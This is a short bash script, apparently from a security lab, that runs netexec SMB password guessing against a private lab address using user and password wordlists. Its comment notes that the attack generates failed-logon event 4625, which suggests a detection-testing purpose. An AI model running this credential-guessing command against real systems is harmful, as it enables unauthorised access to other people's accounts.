#!/bin/bash
# Credential attack: SMB password guessing (generates 4625 on victim)
netexec smb 192.168.56.102 -u users.txt -p pass.txt
